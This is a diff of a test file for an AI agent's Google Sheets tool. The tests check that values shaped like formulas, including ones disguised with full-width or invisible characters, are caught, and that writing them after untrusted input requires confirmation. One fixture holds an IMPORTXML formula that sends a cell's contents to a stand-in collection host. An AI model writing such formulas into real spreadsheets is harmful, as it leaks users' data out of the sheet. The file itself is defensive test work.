@@ -57,6 +57,7 @@ const FETCHING = '=IMPORTXML("https://collect.example/p?d="&A1, "//a")';
 const WRITTEN = { ok: true, json: async () => ({ updatedRange: 'Sheet1!B2:C3', updatedRows: 2, updatedColumns: 2, updatedCells: 4 }) };
 const APPENDED = { ok: true, json: async () => ({ updates: { updatedRange: 'Sheet1!A9:B9', updatedRows: 1, updatedCells: 2 } }) };
 
+const HIDDEN = 'Writing as formulas is offered only when every formula is shown here. To write them as formulas, ask in the chat to write at most 5 at a time.';
 const PLAIN_WRITE_QUESTION = 'Overwrite range "Sheet1!B2:C3" in spreadsheet sid? This will replace existing data.';
 
 describe('a cell that starts like a formula', () => {
@@ -66,8 +67,9 @@ describe('a cell that starts like a formula', () => {
     ['Alice', false], ['', false], ['a=b', false],
     // Read as Google might normalise it: a full-width sign, an invisible character in front.
     ['＝IMPORTXML("https://x.example", "//a")', true], ['\u200b=A1', true], ['\ufeff=A1', true], ['＋A1', true],
-    // …and a signed number stays a number after that (it folds, then reads as plain)…
-    ['－５', false], ['\u200b-5', false], ['－１,５', false], ['\u200b+3.5', false],
+    // …and a signed number stays a number after that: each of these would count as a formula
+    // if the value were not folded and cleaned before the plain-number test.
+    ['-５', false], ['-\u200b5', false], ['+１,５', false], ['-1\u200b2', false],
     // …while a value with no sign in front is no formula, folded or not.
     ['\u200b12', false], ['Ａlice', false], ['１,５', false],
   ])('%j is counted as a formula: %s', (value, expected) => {
@@ -200,7 +202,7 @@ describe('google_sheets after content from outside the chat', () => {
     await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5', '=6', '=7']] }, a);
     const lines = flattenPrompt(asked(a).prompt).split('\n');
     expect(lines.slice(-7)).toEqual(['A1: =1', 'B1: =2', 'C1: =3', 'D1: =4', 'E1: =5', 'and 2 more',
-      'Writing as formulas is offered only when every formula is shown here. To write them as formulas, ask in the chat to write at most 5 at a time.']);
+      HIDDEN]);
     expect(lines[2]).toContain('7 of these cells start like a formula');
     expect(asked(a).options).toEqual(['Write as text', 'Don’t write']);
   });
@@ -211,12 +213,21 @@ describe('google_sheets after content from outside the chat', () => {
     expect(mockFetch).not.toHaveBeenCalled();
   });
 
+  it('says why and offers two choices from the sixth formula on', async () => {
+    const a = agent('sawUntrustedData', 'Don’t write');
+    await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5', '=6']] }, a);
+    expect(flattenPrompt(asked(a).prompt).split('\n').slice(-2)).toEqual(['and 1 more', HIDDEN]);
+    expect(asked(a).options).toEqual(['Write as text', 'Don’t write']);
+    // The sentence is the question's own words, not a value set apart.
+    expect(promptSegments(asked(a).prompt).filter((s) => s.kind === 'value').map((s) => s.text).join(' ')).not.toContain('at most');
+  });
+
   it('offers to write formulas when exactly five are shown and none is hidden', async () => {
     const a = agent('sawUntrustedData', 'Don’t write');
     await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5']] }, a);
     expect(asked(a).options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
     expect(flattenPrompt(asked(a).prompt)).not.toContain('more');
-    expect(flattenPrompt(asked(a).prompt)).not.toContain('Writing as formulas is offered only');
+    expect(flattenPrompt(asked(a).prompt)).not.toContain(HIDDEN);
   });
 
   it('keeps a formula whole but on one line, so it cannot draw another cell', async () => {
